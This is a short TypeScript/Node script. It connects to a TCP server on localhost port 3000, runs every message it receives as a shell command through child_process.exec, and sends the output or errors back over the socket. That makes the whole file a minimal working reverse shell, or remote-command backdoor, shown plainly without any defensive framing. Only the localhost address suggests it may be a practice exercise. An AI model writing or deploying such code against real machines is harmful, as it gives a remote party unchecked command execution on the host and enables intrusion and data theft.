import { Socket } from "net";
import { exec } from "child_process";
import { EventEmitter } from "stream";
const socket = new Socket();

socket.connect(3000, "localhost", () => {
    console.log("Connected to server");
});

socket.on("data", (data: Buffer) => {
    console.log("Received:", data.toString());
    let command: string = data.toString();
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            socket.write(error.message);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            socket.write(stderr);
            return;
        }
        //console.log(`stdout: ${stdout}`);
        socket.write(stdout);
    });
});
